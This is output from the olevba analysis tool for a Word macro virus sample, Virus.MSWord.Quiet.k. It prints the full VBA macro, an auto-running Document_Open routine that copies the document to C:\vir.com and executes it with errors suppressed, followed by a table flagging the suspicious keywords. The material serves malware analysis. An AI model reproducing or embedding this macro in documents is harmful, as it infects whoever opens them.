olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quiet.k
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Quiet.k 
in file: Virus.MSWord.Quiet.k - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Sub CopyFileA Lib "kernel32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
Sub Document_Open()
On Error Resume Next
CopyFileA ActiveDocument.Name, "C:\vir.com", 0
ChDir "C:\"
Shell "C:\vir.com", 4
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
+----------+--------------------+---------------------------------------------+

